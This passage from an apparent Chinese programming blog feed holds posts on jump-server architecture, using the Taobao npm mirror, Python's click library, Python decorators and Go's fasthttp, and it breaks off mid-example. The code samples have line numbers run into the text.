      <content type="text"><![CDATA[一直参与JumpServer的开发, 也一直在想如何设计一个相对完美的跳板机, 跳板机的本质是ssh协议的反向代理(主要还是ssh, 至于rdp还没想过), 虽然也经常使用ssh(做运维的时候还专门就ssh学习过), 但也仅仅是ssh客户端的使用以及服务端的配置, 我觉得一个完美的跳板机应该是从协议层面解决这个问题。因此打算以Golang为开发语言(因为ssh库完善，websocket编写简单),开发一个有基本功能的跳板机。 概述这一系列的博客 包含很多篇, 主要目的是: 在之前的经验上, 把开发过程中涉及到的所有知识和感想记录下来(当然包含源码), 这一系列涉及如下文章, 由浅入深, 循序渐进的介绍开发过程中涉及到的各种知识: 跳板机系列(一)-架构与简介 跳板机系列(二)-ssh协议原理简介 跳板机系列(三)-Golang中SSH客户端的实现 简单架构之前JumpServer的核心是按照简单的架构来开发的, 一个简单的架构其实已经有很多不错的demo或者产品了, 比如这个项目webconsole, 当然他不完整仅仅实现了web，至于命令行并没有实现, 而jumpserver这2个都实现了。为什么称之为简单的架构, 因为他的核心思想就是: 就是模拟一个终端(web端的xterm这个js库就是干这个事儿的, 而命令行同样模拟一个终端就行了, 比如golang的ssh/terminal这个库就可以完成这个事儿),然后通过一个ssh agent访问后面的真实的服务器，起到一个代理转发的作用。 这种模式的缺陷主要体现在命令行终端上面, 因为此时终端后面接的就是ssh客户端, 因此这个终端是一个客户端和跳板机绑定在一起了, 用户只有先登录跳板机才能使用代理服务, 而这显然是不合理的,Jumpserver在此上进行了改进, 通过再添加一个ssh server监听, 实际上就是ssh-in-ssh。 架构改进改进过后主要加入一个ssh的代理服务,统一代理层, 抽离客户端。 完美架构个人架构的能力还是很菜的, 对ssh协议的理解也不深, 当看到teleport这个开源产品的设计时, 完全被惊呆了。 这不就是我想要的架构嘛, 而且细节是做的那么的漂亮。后期如果有时间的话, 打算写一个关于teleport源码解读的系列, 一点一个剖析这个完美架构的实现。 总结写这一个系列不容易, 这是一个开篇和规划，希望最后能完美的收尾，有一个不错的demo展示给大家。现在看来teleport已经很完善了, 也符合我心目中的跳板机的样子, 等读完teleport源码过后, 看其是否完善, 扩展是否方便, 因此很有可能是完善teleport,而不是从头开始。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[nodejs源加速]]></title>
      <url>%2F2017%2F02%2F14%2Fnodejs-accelerate%2F</url>
      <content type="text"><![CDATA[之前介绍过使用vscode搭建nodejs开发环境, 环境是搭建好了, 使用时有一个硬伤, 就是nodejs官方的源下载奇慢, 而一般js的项目依赖又多, 所以经常的结果就是: 慢得你啥都装不上(time out)。怎么解决喃？ 当然是换国内的源。我仅使用过淘宝的加速源，效果不错，一直用着，下面做简单的介绍。 简介淘宝NPM镜像官方是这样描述的: 这是一个完整 npmjs.org 镜像，你可以用此代替官方版本(只读)，同步频率目前为 10分钟 一次以保证尽量与官方服务同步。关于更多的信息请查看:淘宝NPM源官网 同步从registry.npm.taobao.org安装所有模块. 当安装的时候发现安装的模块还没有同步过来, 淘宝NPM会自动在后台进行同步, 并且会让你从官方 NPM registry.npmjs.org 进行安装. 下次你再安装这个模块的时候, 就会直接从 淘宝 NPM 安装了. 安装临时使用的话, 可以通过registry参数来指定淘宝源地址，比如1npm --registry=https://registry.npm.taobao.org xterm 当然也可以添加命令别名,这样就不用每次都添加–registry了12345678910alias cnpm=&quot;npm --registry=https://registry.npm.taobao.org \--cache=$HOME/.npm/.cache/cnpm \--disturl=https://npm.taobao.org/dist \--userconfig=$HOME/.cnpmrc&quot;# Or alias it in .bashrc or .zshrc$ echo &apos;\n#alias for cnpm\nalias cnpm=&quot;npm --registry=https://registry.npm.taobao.org \ --cache=$HOME/.npm/.cache/cnpm \ --disturl=https://npm.taobao.org/dist \ --userconfig=$HOME/.cnpmrc&quot;&apos; &gt;&gt; ~/.zshrc &amp;&amp; source ~/.zshrc 其实淘宝的源很稳定，同步频率也快，因此一般直接替换系统的npm也可以1npm install -g cnpm --registry=https://registry.npm.taobao.org]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python命令行开发神器-click]]></title>
      <url>%2F2017%2F02%2F08%2Fpython-click%2F</url>
      <content type="text"><![CDATA[之前写过一篇博客介绍过如何写漂亮的命令行工具, 不过使用的是golang的cobra库, 整体而言效果和使用体验还是非常不错的, 不过今天看博客时发现了一个更不错的库，而且是Python的: Click,所以用起来应该更得心应手。 之前在开发openstack客户端时, 模仿openstack sdk写过CLI, 他也是对argparse库上做的封装, 但是使用起来也比较复杂, 简单看了下click的文档, 体验还是非常不错的。 简介先说下click的出生, 因为他出生名门: Pocoo, Pocoo是一个团队，Pocoo出品必是精品,比如 Flask, Werkzeug, Jinja 2 , Pygments, Sphinx。冲着pocoo的品牌, 都应该多看一眼click。click是一个用于快速构建命令行的python的第三方模块, 功能强大, 使用简单。我们都知道Python内置的Argparse模块，以前也经常用到, 当时觉得Argparse很不错, 因为没有对比(没有对比就没伤害), 看了下Click马上就觉得Argparse太繁琐了，Click相较于Argparse就好比requests对比urllib。我们看看click官方文档上是怎么说明click的： Click是一个使用最少代码构建漂亮CLI的命令行界面创建工具包, 高度可配置,但是却开箱即用他有3个特点： 支持命令的任意嵌套 支持命令行帮助页面的自动生成 支持子命令运行时惰性加载 快速使用构建CLI有2个要点: 命令和参数, 使用click时，@click.command()用户装饰命令, @click.option()和@click.argument()用于装饰参数, 比如下面就是一个经典的使用形式:12345678910111213import click@click.command()@click.option('--count', default=1, help='Number of greetings.')@click.option('--name', prompt='Your name', help='The person to greet.')def hello(count, name): """Simple program that greets NAME for a total of COUNT times.""" for x in range(count): click.echo('Hello %s!' % name)if __name__ == '__main__': hello() 为了演示他更强大的功能, 我们可以模拟一个docker的命令行。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import click@click.group()def docker(): pass@docker.group()def volume(): """Manage volumes""" pass@volume.command()def create(): """Create a volume""" pass@volume.command()def inspect(): """isplay detailed information on one or more volumes""" pass@volume.command()@click.option('-f', '--filter', type=str, help="Provide filter values (e.g. 'dangling=true')")@click.option('-q', '--quiet', is_flag=True, help='Only display volume names')@click.option('--format', type=str, help='Pretty-print volumes using a Go template')def ls(filter, quiet, format): """List volumes""" print("%s, %s, %s" % (filter, quiet, format))@volume.command()@click.option('-f', '--force', type=str, help='Force the removal of a running container (uses SIGKILL)')@click.option('-l', '--link', type=str, help='Remove the specified link')@click.option('-v', '--volume', type=str, help='Remove the volumes associated with the container')def rm(force, link, volume): """Remove one or more volumes""" print("%s, %s, %s" % (force, link, volume))@docker.group()def network(): """Manage networks""" pass@network.command()def create(): """Create a network""" pass@network.command()def connect(): """Connect a container to a network""" pass@network.command()def ls(): """List networks""" pass@network.command()def rm(): """Remove one or more networks""" passif __name__ == '__main__': docker() 最终效果如下:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859➜ test python3 test.pyUsage: test.py [OPTIONS] COMMAND [ARGS]...Options: --help Show this message and exit.Commands: network Manage networks volume Manage volumes➜ test python3 test.py networkUsage: test.py network [OPTIONS] COMMAND [ARGS]... Manage networksOptions: --help Show this message and exit.Commands: connect Connect a container to a network create Create a network ls List networks rm Remove one or more networks➜ test python3 test.py volumeUsage: test.py volume [OPTIONS] COMMAND [ARGS]... Manage volumesOptions: --help Show this message and exit.Commands: create Create a volume inspect isplay detailed information on one or more... ls List volumes rm Remove one or more volumes➜ test python3 test.py volume ls --helpUsage: test.py volume ls [OPTIONS] List volumesOptions: -f, --filter TEXT Provide filter values (e.g. &apos;dangling=true&apos;) -q, --quiet Only display volume names --format TEXT Pretty-print volumes using a Go template --help Show this message and exit.➜ test python3 test.py volume rm --helpUsage: test.py volume rm [OPTIONS] Remove one or more volumesOptions: -f, --force TEXT Force the removal of a running container (uses SIGKILL) -l, --link TEXT Remove the specified link -v, --volume TEXT Remove the volumes associated with the container --help Show this message and exit. 命令与组这是click中最重要的概念, 我们可以通过command和group装饰器实现一个无限嵌套的命令行工具, 其中command用户装饰命令, group用于将命令分组(类)上面那个模块docker命令行就是分组的使用。123456789101112131415161718192021222324import click@click.group()def docker(): pass@docker.group()def volume(): """Manage volumes""" pass@docker.group()def network(): """Manage networks""" pass@network.command()def create(): """Create a network""" passif __name__ == '__main__': docker() 命令行参数从命令行读取参数值，再将其传递给函数,读取的参数分为两类: 可选参数和必须参数，下面分别做介绍 可选参数使用@click.option装饰器完成可选参数的录入, 通过上面的栗子我们可以发现该装饰器有很多参数前面2个位置参数比如’-f’, ‘–force’用于描述参数名称, type指明参数等，option常用的设置参数如下： default: 设置命令行参数的默认值 help: 参数说明 type: 参数类型，可以是 string, int, float 等 prompt: 当在命令行中没有输入相应的参数时，会根据 prompt 提示用户输入 nargs: 指定命令行参数接收的值的个数我们可以依然这些选项来完成我们很长常用的功能 默认参数经常我们需要为参数设置一些默认值, 使用default指定参数的默认值就能办到, 就这么简单12345678910111213141516171819202122232425import click@click.group()def docker(): pass@docker.group()def volume(): """Manage volumes""" pass@docker.group()def network(): """Manage networks""" pass@network.command()@click.option('-n', '--name', type=str, default='flat', help='The network name')def create(name): """Create a network""" click.echo('create network %s success' % name)if __name__ == '__main__': docker() 运行结果:123456789101112➜ test python3 test.py network --helpUsage: test.py network [OPTIONS] COMMAND [ARGS]... Manage networksOptions: --help Show this message and exit.Commands: create Create a network➜ test python3 test.py network createcreate network flat success 选择参数很多情况下, 我们也会给用户一些选择参数, 比如性别就只能选择(M/F), 因此我们应该提示用户输入正确的值,在这种情况下，我们可以通过 click.Choice() 来限定1234567891011@user.command()@click.option('-g', '--gender', type=click.Choice(['male', 'female']), help="The user's gender")@click.help_option('-h', '--help')def create(gender): """Create a user""" if gender is None: raise click.BadOptionUsage("miss gender choice!") click.echo("user's gender is %s" % gender)if __name__ == '__main__': docker() 多值参数有时，一个参数需要接收多个值, 比如我们算一个立方体的体积, 这时候我们就需求通过nargs指定 该参数接收多少个值, 比如123456789@cube.command()@click.option('-p', '--profile', type=int, nargs=3 ,help="The cube Length, width and height")@click.help_option('-h', '--help')def volume(profile): """Compute cube's volume""" if profile is None: raise click.BadOptionUsage("miss profile!") v = profile[0] * profile[1] * profile[2] click.echo("the cube's volume is %s" % v) 密码参数命令行我们常常有输入密码的需求，这个我们应该怎么用喃？123456@user.command()@click.option('-p', '--password', prompt=True, hide_input=True, confirmation_prompt=True)@click.help_option('-h', '--help')def create(password): """Create a user""" click.echo('Encrypting password to %s' % password) 这个看下效果:1234➜ test python3 test.py user createPassword:Repeat for confirmation:Encrypting password to 123 必选参数相较于可选参数的灵活性而言, 必须参数比较简单了。用@click.argument来添加固定参数。 定参这里需要主要位置参数的顺序了。比如3个定参数 x y z1234567@user.command()@click.argument('x')@click.argument('y')@click.argument('z')def create(x, y, z): """Create a user""" click.echo("%s, %s, %s" % (x, y, z)) 12345678910➜ test python3 test.py user create 1Usage: test.py user create [OPTIONS] X Y ZError: Missing argument "y".➜ test python3 test.py user create 1 2Usage: test.py user create [OPTIONS] X Y ZError: Missing argument "z".➜ test python3 test.py user create 1 2 31, 2, 3 不定参参数不定的情况也是常有的, 比如我们想将多个文件移到一个文件里面, src: file1 file2 file3 dir: file4。我们让nargs=-1就可以了, 他表示接收[:-1]的参数1234567@user.command()@click.argument('src', nargs=-1)@click.argument('dst', nargs=1)def create(src, dst): """Create a user""" click.echo("src: %s" % ' '.join(list(src))) click.echo("dst: %s" % dst) 123➜ test python3 test.py user create file1 file2 file3 file4src: file1 file2 file3dst: file4 其他功能click还有比较多的高级功能，比如分页和彩色打印, click文档写得比较好: click官方文档 总结pocoo非常热衷于使用装饰器, 可以说他们对装饰器的使用简直出神入化, 在flask里面就可见一斑, 而前一篇才讲了装饰器, 这个click库里面对装饰器的使用也称得上典范, 源码很值得一读。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python进阶系列-装饰器]]></title>
      <url>%2F2017%2F02%2F05%2Fpython-deractor%2F</url>
      <content type="text"><![CDATA[装饰器是一个非常重要的概念，可能算是进阶的一大门槛。装饰器允许向一个现有的对象添加新的功能，同时又不改变其结构,是一种功能增强的模式。在面向对象(OOP)的设计模式中，decorator被称为装饰模式。OOP的装饰模式需要通过继承和组合来实现，而Python除了能支持OOP的decorator外，直接从语法层次支持decorator。Python的decorator可以用函数实现，也可以用类实现。接下来将全面介绍关于Python装饰器相关的知识。 简介装饰器本质上是一个Python函数，它可以让其他函数在不需要做任何代码变动的前提下增加额外功能，装饰器的返回值也是一个函数对象。它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景。装饰器是解决这类问题的绝佳设计，有了装饰器，我们就可以抽离出大量与函数功能本身无关的雷同代码并继续重用。概括的讲，装饰器的作用就是为已经存在的函数或对象添加额外的功能。 引子在Python里，一切皆对象, 函数更是头等对象，函数对象可以被赋值给变量，所以，通过变量也能调用该函数12345678&gt;&gt;&gt; def now():... print('2017-02-02')...&gt;&gt;&gt; f = now&gt;&gt;&gt; f()2017-02-02&gt;&gt;&gt; f.__name__'now' 现在，假设我们要增强now()函数的功能，比如，在函数调用前后自动打印日志，但又不希望修改now()函数的定义,该怎么做喃？最简单的方式就是动态替换now，并保持函数签名不变123456789101112131415def now(): print('2017-02-02')def debug(func): def wrapper(): print("[DEBUG]: enter &#123;&#125;()".format(func.__name__)) return func() wrapper.__name__ = func.__name__ return wrappernow = debug(now)now() 为了方便python在语法层面就已经支持了装饰器(python &gt; 2.4),@语法糖实际上就等于now = debug(now), 因此实际上应该这样写1234567891011121314def debug(func): def wrapper(): print("[DEBUG]: enter &#123;&#125;()".format(func.__name__)) return func() wrapper.__name__ = func.__name__ return wrapper@debugdef now(): print('2017-02-02')now() 这个dubug装饰器有个巨大的缺陷: 我们只能装饰不带参数的函数。实际上函数的形式各种各样，如何才能一个装饰器适配各种函数喃？python提供的可变参数可以很好的解决这个问题。12345678910111213141516171819def debug(func): def wrapper(*args, **kwargs): print("[DEBUG]: enter &#123;&#125;()".format(func.__name__)) return func(*args, **kwargs) wrapper.__name__ = func.__name__ return wrapper@debugdef now(): print('2017-02-02')@debugdef hello(name): print("hello %s" % name)now()hello("Bob") 如此一个基础的装饰器就写完了，以下将介绍各式各样的装饰器。 函数式装饰器装饰器本身是一个函数 装饰函数被装饰的对象是一个函数, wrapper是对函数的增强 基础-装饰器无参数这是最基础的一种装饰器, 在引子中已经有栗子了。 高级-装饰器有参数带参数的装饰器和类装饰器属于进阶的内容。在理解这些装饰器之前，最好对函数的闭包和装饰器的接口约定有一定了解。关于python中的闭包概念我在下一篇中会单独介绍,这里你只需要知道闭包是一个携带状态的函数即可。实际上就是返回装饰器的一个函数，但是这个装饰器携带外部变量(这就是闭包)12345678910111213141516171819def debug(level='INFO'): def decorator(func): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125;()".format(level, func.__name__)) return func(*args, **kwargs) wrapper.__name__ = func.__name__ return wrapper return decorator@debug()def now(): print('2017-02-02')@debug("DEBUG")def hello(name): print("hello %s" % name)now()hello("Bob") 装饰类被装饰的对象是一个类,wrapper是对类的增强,所以装饰器的变化并不大,甚至可以沿用 基础-装饰器无参数123456789101112131415161718def debug(cls): def wrapper(*args, **kwargs): print("[DEBUG]: enter &#123;&#125; class".format(cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name_ return wrapper@debugclass Hello(object): def __init__(self, value): self.value = value@debugdef hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") 高级-装饰器有参数1234567891011121314151617181920212223def debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decorator@debug()class Hello(object): def __init__(self, value): self.value = value@debug("ERROR")def hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") 类式装饰器装饰器函数其实是这样一个接口约束，它必须接受一个callable对象作为参数，然后返回一个callable对象。在Python中一般callable对象都是函数，但也有例外。只要某个对象重载了 call () 方法，那么这个对象就是callable的。我们可以让类的构造函数 init () 接受一个函数，然后重载 call () 并返回一个函数，也可以达到装饰器函数的效果。 装饰函数和类被装饰的对象是一个函数或是一个类，其实并没有本质上的差别，因此这里合并给出栗子 装饰器无参数1234567891011121314151617181920class debug(object): def __init__(self, func): self.func = func def __call__(self, *args, **kwargs): print("[DEBUG]: enter function &#123;func&#125;()".format(func=self.func.__name__)) return self.func(*args, **kwargs)@debugclass Hello(object): def __init__(self, value): self.value = value@debugdef hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") 装饰器有参数1234567891011121314151617181920212223class debug(object): def __init__(self, level='INFO'): self._level = level def __call__(self, func): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter function &#123;&#125;()".format(self._level ,func.__name__)) return func(*args, **kwargs) return wrapper@debug()class Hello(object): def __init__(self, name): self.name = name@debug("ERROR")def hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") 内置装饰器内置的装饰器和普通的装饰器原理是一样的，只不过返回的不是函数，而是类对象，所以更难理解一些 propert我们先看看property到底是啥,以下是property类的doc string123456789101112131415161718192021222324252627282930313233class property(object): """ property(fget=None, fset=None, fdel=None, doc=None) -&gt; property attribute fget is a function to be used for getting an attribute value, and likewise fset is a function for setting, and fdel a function for del'ing, an attribute. Typical use is to define a managed attribute x: class C(object): def getx(self): return self._x def setx(self, value): self._x = value def delx(self): del self._x x = property(getx, setx, delx, "I'm the 'x' property.") Decorators make defining new properties or modifying existing ones easy: class C(object): @property def x(self): "I am the 'x' property." return self._x @x.setter def x(self, value): self._x = value @x.deleter def x(self): del self._x """ def __init__(self, fget=None, fset=None, fdel=None, doc=None): # known special case of property.__init__ pass ... 实际上property装饰器帮我们完成了x = property(getx, setx, delx, &quot;I&#39;m the &#39;x&#39; property.&quot;)这个动作，而且返回的是一个property对象。 staticmethodstaticmethod传入一个函数返回一个staticmethod的对象。123456789101112131415161718192021222324class staticmethod(object): """ staticmethod(function) -&gt; method Convert a function to be a static method. A static method does not receive an implicit first argument. To declare a static method, use this idiom: class C: def f(arg1, arg2, ...): ... f = staticmethod(f) It can be called either on the class (e.g. C.f()) or on an instance (e.g. C().f()). The instance is ignored except for its class. Static methods in Python are similar to those found in Java or C++. For a more advanced concept, see the classmethod builtin. """ def __init__(self, function): # real signature unknown; restored from __doc__ pass ... classmethod同理classmethod传入一个函数返回一个classmethod对象。123456789101112131415161718192021222324252627class classmethod(object): """ classmethod(function) -&gt; method Convert a function to be a class method. A class method receives the class as implicit first argument, just like an instance method receives the instance. To declare a class method, use this idiom: class C: def f(cls, arg1, arg2, ...): ... f = classmethod(f) It can be called either on the class (e.g. C.f()) or on an instance (e.g. C().f()). The instance is ignored except for its class. If a class method is called for a derived class, the derived class object is passed as the implied first argument. Class methods are different than C++ or Java static methods. If you want those, see the staticmethod builtin. """ def __init__(self, function): # real signature unknown; restored from __doc__ pass ... 需要注意的问题装饰器可以让你代码更加优雅，减少重复，但也不全是优点，也会带来一些问题。 位置错误1234567891011121314151617181920212223def html_tags(tag_name): print('begin outer function.') def wrapper(func): print("begin of inner wrapper function.") def wrapper(*args, **kwargs): content = func(*args, **kwargs) print("&lt;&#123;tag&#125;&gt;&#123;content&#125;&lt;/&#123;tag&#125;&gt;".format(tag=tag_name, content=content)) print('end of inner wrapper function.') return wrapper print('end of outer function') return wrapper@html_tags('b')def hello(name='Toby'): return 'Hello &#123;&#125;!'.format(name)hello()hello() 在装饰器中我在各个可能的位置都加上了 print 语句，用于记录被调用的情况。你知道他们最后打印出来的顺序吗？如果你心里没底，那么最好不要在装饰器函数之外添加逻辑功能，否则这个装饰器就不受你控制了1234567begin outer function.end of outer functionbegin of inner wrapper function.&lt;b&gt;Hello Toby!&lt;/b&gt;end of inner wrapper function.&lt;b&gt;Hello Toby!&lt;/b&gt;end of inner wrapper function. 函数签名和文档使用装饰器后实际上函数的前面和文档都会被替换成wrapper的，虽然我们可以简单处理过来,但是这并不是完美的解决之道123456789101112131415161718192021222324252627282930import inspectdef debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decorator@debug()class Hello(object): def __init__(self, value): self.value = value@debug("ERROR")def hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob")print(Hello.__name__)print(hello.__name__)print(inspect.getsource(Hello))print(inspect.getsource(hello)) staticmethod和classmethod不能再次装饰当你想把装饰器用在一个静态方法或者类方法时，不好意思，报错了。12345678910111213141516171819202122232425262728293031def debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decoratorclass Car(object): def __init__(self, model): self.model = model @debug # 装饰实例方法，OK def run(self): print("&#123;&#125; is running!".format(self.model)) @debug # 装饰静态方法，Failed @staticmethod def check_model_for(obj): if isinstance(obj, Car): print("The model of your car is &#123;&#125;".format(obj.model)) else: print("&#123;&#125; is not a car!".format(obj))car = Car('six')car.check_model_for(car) 前面已经解释了@staticmethod这个装饰器，其实它返回的并不是一个callable对象，而是一个staticmethod对象，那么它是不符合装饰器要求的（比如传入一个callable对象），你自然不能在它之上再加别的装饰器。要解决这个问题很简单，只要把你的装饰器放在@staticmethod之前就好了，因为你的装饰器返回的还是一个正常的函数，然后再加上一个@staticmethod是不会出问题的。12345678910111213141516171819202122232425262728293031def debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decoratorclass Car(object): def __init__(self, model): self.model = model @debug() # 装饰实例方法，OK def run(self): print("&#123;&#125; is running!".format(self.model)) @staticmethod @debug() # 静态装饰器放到最后就ok了 def check_model_for(obj): if isinstance(obj, Car): print("The model of your car is &#123;&#125;".format(obj.model)) else: print("&#123;&#125; is not a car!".format(obj))car = Car('six')car.check_model_for(car) 利用第三方库来写装饰器嵌套的装饰函数不太直观，我们可以使用第三方包类改进这样的情况，让装饰器函数可读性更好。 decoratordecorator.py是一个非常简单的装饰器加强包。你可以很直观的先定义包装函数wrapper() ，再使用decorate(func, wrapper)方法就可以完成一个装饰器。1234567891011121314151617181920@decoratordef debug(func, *args, **kwargs): print("[DEBUG] &#123;&#125;: enter &#123;&#125;()".format(datetime.now(), func.__name__)) return func(*args, **kwargs)@debugdef hello(name): """test""" print("hello %s" % name)@debugclass Hello(object): def __init__(self, name): self.name = namehello("Bob")print(inspect.getsource(hello))print(hello.__name__) decorator比较简陋, 要装饰类和带参数的装饰就不能很好支持了。 wraptwrapt是一个功能非常完善的包，用于实现各种你想到或者你没想到的装饰器。使用 wrapt 实现的装饰器你不需要担心之前 inspect 中遇到的所有问题，因为它都帮你处理了，甚至 inspect.getsource ( func ) 也准确无误更全面的文档可以参考wrapt官方文档123456789101112131415161718192021222324252627282930313233343536373839404142434445from datetime import datetimeimport wraptdef debug(level='INFO'): @wrapt.decorator def wrapper(wrapped, instance, args, kwargs): print("[&#123;&#125;]: &#123;&#125; message".format(level, datetime.now())) return wrapped(*args, **kwargs) return wrapperclass Class(object): @debug() def function_im(self, arg1, arg2): pass @debug("DEBUG") @classmethod def function_cm(cls, arg1, arg2): pass @debug("ERROR") @staticmethod def function_sm(arg1, arg2): pass@debug()class Hello(): def __init__(self, name): self.name = name@debug()def hello(name): print("hello %s" % name)c = Class()c.function_im(1, 2)Class.function_im(c, 1, 2)Class.function_cm(1, 2)Class.function_sm(1, 2)h = Hello("Bob")hello("Bob") 总结装饰器的理念是对原函数、对象的加强，相当于重新封装，所以一般装饰器函数都被命名为wrapper() ，意义在于包装。函数只有在被调用时才会发挥其作用。比如@debug 装饰器可以在函数执行时额外输出日志， @cache装饰过的函数可以缓存计算结果等等。最后避免重复造轮子推荐使用wrapt，除非wrapt真不能满足你的特性需求。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[高性能web之fasthttp]]></title>
      <url>%2F2017%2F01%2F25%2Ffasthttp%2F</url>
      <content type="text"><![CDATA[浏览网上博客时发现了这么一篇测试文章nginx vs iris, 结果是iris越胜一筹, 而Iris底层使用的并不是Golang的HTTP的标准库, 而是使用的第三方库fasthttp, 之前读过一点关于golang的net/http, 在处理用户的请求时的确有点粗暴, 直接一个连接一个goroutine, 完全没有并发的控制。按捺不做内心的好奇, 想感受一把fasthttp, 来一起走进fasthttp的世界看看。 Benchmark的的胜出github上面有一个好事者写了一个Go Web框架性能的压测工具, 结果是fasthttp表现非常优异, 具体请查看go-web-framework-benchmark github地址请允许我贴一张他的图 简介fasthttp是Go的HTTP的第三方实现, 它宣称比标准库net/http快10倍, 是一款高性能的HTTP实现。Github中的Fasthttp best practices这段描述了它为啥高性能的原因 net/http 的实现是一个连接新建一个 goroutine; fasthttp是利用一个 worker 复用 goroutine，减轻 runtime 调度 goroutine 的压力 net/http 解析的请求数据很多放在 map[string]string (http.Header) 或 map[string][]string (http.Request.Form)，有不必要的 []byte 到 string 的转换，是可以规避的 net/http 解析 HTTP 请求每次生成新的 http.Request 和 http.ResponseWriter; fasthttp解析 HTTP 数据到 fasthttp.RequestCtx ，然后使用 sync.Pool复用结构实例，减少对象的数量 fasthttp会延迟解析 HTTP 请求中的数据，尤其是 Body 部分。这样节省了很多不直接操作 Body 的情况的消耗 但是因为fasthttp的实现与标准库差距较大，所以API的设计完全不同, 因此也不兼容标准库net/http。使用时既需要理解HTTP的处理过程，又需要注意和标准库的差别。 基本使用基本用法很简单, 1. 写好handler 2. 监听交给handler处理.12345678910111213141516171819package mainimport ( "fmt" "github.com/valyala/fasthttp")// 使用RequestCtx传递HTTP的数据func httpHandler(ctx *fasthttp.RequestCtx) &#123; fmt.Fprint(ctx, "hello fasthttp")&#125;// 启动服务时指定处理任务的handlerfunc main() &#123; if err := fasthttp.ListenAndServe("0.0.0.0:8080", httpHandler); err != nil &#123; fmt.Println("start fasthttp fail:", err.Error()) &#125;&#125; 路由net/http提供http.ServeMux实现路由服务，但是匹配规则简陋，功能很简单，基本不会使用。 fasthttp吸取教训，默认没有提供路由支持。官方提到了4个路由实现: Iris, fasthttp-routing, fasthttproute, lu, 第一个是框架, 第二三个是单纯的路由, 第4个不知道。我这里选择fasthttprouter, 因为github上面这个项目文档和活跃度比较不错 安装fasthttprouter12345678➜ Blogs go get -u -v &quot;github.com/buaazp/fasthttprouter&quot;github.com/buaazp/fasthttprouter (download)github.com/valyala/fasthttp (download)github.com/klauspost/compress (download)github.com/klauspost/cpuid (download)github.com/klauspost/crc32 (download)github.com/valyala/bytebufferpool (download)github.com/buaazp/fasthttprouter 简单使用详尽的使用还得去看Github或者源码, 请允许我贴一段官方的代码, 我本地也用着这个测12345678910111213141516171819202122232425package mainimport ( "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Index(ctx *fasthttp.RequestCtx) &#123; fmt.Fprint(ctx, "Welcome!\n")&#125;func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func main() &#123; router := fasthttprouter.New() router.GET("/", Index) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; 请求和响应在fasthttp中使用一个对象来维护请求的上下文:RequestCtx, 它综合了http.Request和http.ResponseWriter的操作，可以更方便的读取和返回数据, 通过下图这种对照表我们可以清晰的看出来12345678910111213141516171819202122232425262728293031r.Body -&gt; ctx.PostBody()r.URL.Path -&gt; ctx.Path()r.URL -&gt; ctx.URI()r.Method -&gt; ctx.Method()r.Header -&gt; ctx.Request.Headerr.Header.Get() -&gt; ctx.Request.Header.Peek()r.Host -&gt; ctx.Host()r.Form -&gt; ctx.QueryArgs() + ctx.PostArgs()r.PostForm -&gt; ctx.PostArgs()r.FormValue() -&gt; ctx.FormValue()r.FormFile() -&gt; ctx.FormFile()r.MultipartForm -&gt; ctx.MultipartForm()r.RemoteAddr -&gt; ctx.RemoteAddr()r.RequestURI -&gt; ctx.RequestURI()r.TLS -&gt; ctx.IsTLS()r.Cookie() -&gt; ctx.Request.Header.Cookie()r.Referer() -&gt; ctx.Referer()r.UserAgent() -&gt; ctx.UserAgent()w.Header() -&gt; ctx.Response.Headerw.Header().Set() -&gt; ctx.Response.Header.Set()w.Header().Set(&quot;Content-Type&quot;) -&gt; ctx.SetContentType()w.Header().Set(&quot;Set-Cookie&quot;) -&gt; ctx.Response.Header.SetCookie()w.Write() -&gt; ctx.Write(), ctx.SetBody(), ctx.SetBodyStream(), ctx.SetBodyStreamWriter()w.WriteHeader() -&gt; ctx.SetStatusCode()w.(http.Hijacker).Hijack() -&gt; ctx.Hijack()http.Error() -&gt; ctx.Error()http.FileServer() -&gt; fasthttp.FSHandler(), fasthttp.FShttp.ServeFile() -&gt; fasthttp.ServeFile()http.Redirect() -&gt; ctx.Redirect()http.NotFound() -&gt; ctx.NotFound()http.StripPrefix() -&gt; fasthttp.PathRewriteFunc 下面是一个简单例子，在上下文中获取请求数据, 通过WriteString来返回响应。1234567891011121314151617181920212223242526272829303132333435363738package mainimport ( "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func httpHandler(ctx *fasthttp.RequestCtx) &#123; ctx.WriteString("hello,fasthttp") // 因为实现不同，fasthttp 的返回内容不是即刻返回的 // 不同于标准库，添加返回内容后设置状态码，也是有效的 ctx.SetStatusCode(404) // 